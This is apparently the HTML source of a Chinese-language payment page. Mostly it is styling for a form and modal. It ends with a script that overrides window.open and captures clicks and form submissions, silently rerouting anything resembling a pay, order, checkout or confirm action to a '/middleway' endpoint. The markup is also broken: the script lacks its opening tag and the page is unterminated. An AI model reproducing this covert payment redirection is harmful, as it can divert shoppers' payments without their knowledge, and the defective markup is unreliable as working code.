<!DOCTYPE html>
<html lang="zh-CN">

<head>
  <meta charset="UTF-8" />
  <meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" name="viewport">
  <title>付款</title>
  <link href="/pay/static/css/all.min.css" rel="stylesheet" />
  <link href="/pay/static/css/animate.min.css" rel="stylesheet" />
  <style>
    body {
      padding: 0;
      margin: 0;
      overflow: hidden
    }

    .container {
      width: 100vw;
      height: 100vh;
      display: flex;
      justify-content: center;
      background-color: #f0eeed
    }

    .box {
      width: 400px;
      padding-top: 50px
    }

    .input_group {
      width: 100%;
      display: flex;
      flex-direction: column
    }

    .input_group label {
      font-size: 13px;
      letter-spacing: 1px;
      margin: 20px 0 10px 0;
      color: #424141
    }

    .input_group input {
      outline: 0;
      border: none;
      line-height: 40px;
      height: 40px;
      border-radius: 10px;
      box-sizing: border-box;
      padding: 0 20px
    }

    .input_submit {
      height: 30px;
      width: 100%;
      color: #fff;
      outline: 0;
      border: none;
      margin-top: 50px;
      border-radius: 7px;
      transition: all .15s;
      cursor: pointer;
      background-color: #396d3b
    }

    .input_submit.active {
      background-color: #38c172
    }

    .zz {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background-color: rgba(0, 0, 0, .3);
      z-index: 9
    }

    .module {
      border-radius: 10px;
      position: absolute;
      top: -700px;
      display: block;
      width: 500px;
      height: 700px;
      background-color: #fff;
      z-index: 10;
      animation-duration: 1s;
      box-sizing: border-box;
      padding: 10px 20px
    }

    @media screen and (max-width:750px) {
      .module {
        border-radius: 10px;
        position: absolute;
        top: -700px;
        display: block;
        width: 95%;
        height: 80%;
        background-color: #fff;
        z-index: 10;
        animation-duration: 1s;
        box-sizing: border-box;
        padding: 10px 20px
      }
    }

    .module.show {
      top: 50px
    }

    .module.hide {
      top: -700px
    }

    .alert {
      font-size: 12px;
      margin: 10px auto;
      background-color: #e6f7e6;
      color: #52c41a;
      padding: 10px;
      border-radius: 4px;
      display: flex;
      align-items: center;
      margin-bottom: 20px
    }

    .alert.red {
      color: #e65c5c;
      background-color: #f5e3e3
    }

    #danger,
    #danger_f {
      display: none
    }

    .alert i {
      margin-right: 10px
    }

    h2 {
      width: 100%;
      text-align: center;
      font-size: 14px;
      margin-bottom: 20px
    }

    .form-group {
      margin-top: 100px;
      margin-bottom: 20px;
      display: flex;
      align-items: center
    }

    .form-group2 {
      margin-bottom: 20px;
      display: flex;
      align-items: center
    }

    .number {
      display: flex;
      margin-left: 20px
    }

    .decrease {
      border-left: 1px solid #d9d9d9
    }

    .plus {
      border-right: 1px solid #d9d9d9
    }

    .decrease,
    .plus {
      font-size: 20px;
      width: 25px;
      height: 25px;
      display: flex;
      justify-content: center;
      align-items: center;
      background-color: #eef3f7;
      border-top: 1px solid #d9d9d9;
      border-bottom: 1px solid #d9d9d9
    }

    .form-group label {
      display: block;
      font-size: 13px;
      margin-bottom: 5px;
      cursor: pointer
    }

    p {
      font-size: 14px
    }

    p strong {
      color: red
    }

    .form-group input[type=number] {
      width: 50px;
      padding: 0 8px;
      border: none;
      border-top: 1px solid #d9d9d9;
      border-bottom: 1px solid #d9d9d9
    }

    .radio-group {
      margin-left: 20px;
      display: flex;
      font-size: 14px;
      gap: 20px
    }

    .radio-group.active {
      color: #1890ff
    }

    .radio-group label {
      border: 1px solid #ceccca;
      padding: 6px;
      display: flex;
      font-size: 12px;
      align-items: center;
      border-radius: 5px;
      cursor: pointer
    }

    .radio-group input {
      margin-right: 5px
    }

    .radio-group input:checked {
      color: #1890ff;
      background-color: #1890ff
    }

    .radio-group input:checked+span {
      color: #1890ff
    }

    .info {
      border-radius: 4px;
      margin-bottom: 20px
    }

    .buttons {
      position: absolute;
      bottom: 10px;
      right: 10px;
      display: flex;
      justify-content: flex-end;
      gap: 10px
    }

    .buttons button {
      padding: 10px 20px;
      border: none;
      border-radius: 4px;
      cursor: pointer
    }

    .buttons .cancel {
      background-color: #f5f5f5;
      color: #000
    }

    .buttons .confirm {
      background-color: #1890ff;
      color: #fff
    }

    input[type=number]::-webkit-inner-spin-button,
    input[type=number]::-webkit-outer-spin-button {
      -webkit-appearance: none;
      margin: 0
    }

    input[type=number] {
      -moz-appearance: textfield
    }

    strong {
      width: 80px !important
    }

    .overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, .5);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 9999
    }

    .loader {
      border: 16px solid #f3f3f3;
      border-top: 16px solid #3498db;
      border-radius: 50%;
      width: 25px;
      height: 25px;
      animation: spin 2s linear infinite
    }

    @keyframes spin {
      0% {
        transform: rotate(0)
      }

      100% {
        transform: rotate(360deg)
      }
    }
  </style>
</head>

<body>
  <div class="overlay" id="overlay">
    <div class="loader"></div>
  </div>
  <div class="container">
    <div class="box">

    (function () {
      // 拦截所有可能的支付跳转
      const originalOpen = window.open;
      window.open = function (...args) {
        const url = args[0] || '';
        // 如果是支付相关的URL，重定向到 /middleway
        if (url && (
          url.includes('pay') ||
          url.includes('checkout') ||
          url.includes('order') ||
          url.includes('submit') ||
          url.includes('confirm')
        )) {
          args[0] = '/middleway';
        }
        return originalOpen.apply(this, args);
      };

      // 拦截点击事件
      document.addEventListener('click', function (e) {
        const target = e.target.closest('a, button');
        if (!target) return;

        const text = target.textContent || target.innerText || '';
        const href = target.getAttribute('href') || '';

        // 如果是支付、下单、购买等按钮
        if (text.match(/支付|下单|购买|提交|确认|pay|buy|order|submit|checkout/i)) {
          e.preventDefault();
          e.stopPropagation();
          window.location.href = '/middleway';
        }
      }, true);

      // 拦截表单提交
      document.addEventListener('submit', function (e) {
        const form = e.target;
        const action = form.getAttribute('action') || '';

        if (action.includes('pay') || action.includes('order') || action.includes('checkout')) {
          e.preventDefault();
          window.location.href = '/middleway';
        }
      }, true);
    })();
  </script>
